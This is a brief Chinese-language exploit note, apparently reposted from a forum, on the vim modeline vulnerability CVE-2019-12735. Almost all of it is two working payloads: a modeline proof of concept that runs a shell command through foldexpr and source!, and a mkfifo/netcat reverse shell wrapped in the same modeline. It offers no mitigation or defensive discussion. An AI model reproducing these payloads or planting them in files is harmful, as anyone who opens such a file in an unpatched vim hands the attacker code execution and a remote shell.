# （CVE-2019-12735）vim modeline

> 原文：[https://www.zhihuifly.com/t/topic/3492](https://www.zhihuifly.com/t/topic/3492)

# （CVE-2019-12735）vim modeline

该漏洞存在于编辑器的 modeline功能，部分 Linux 发行版默认启用了该功能，macOS 是没有默认启用。 当vim打开一个包含了vim modeline注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置。vim默认关闭modeline。 开启：

```
vim ~/.vimrc
//文件内容为
set modeline 
```

```
poc:
:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt=" 
```

![image](img/dc8dad288e07d3184d089aadf2f403ae.png)

反弹shell：

```
:!rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1  9999 >/tmp/f||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt=" 
```

![image](img/73bd333857e534c951328903856de2e5.png)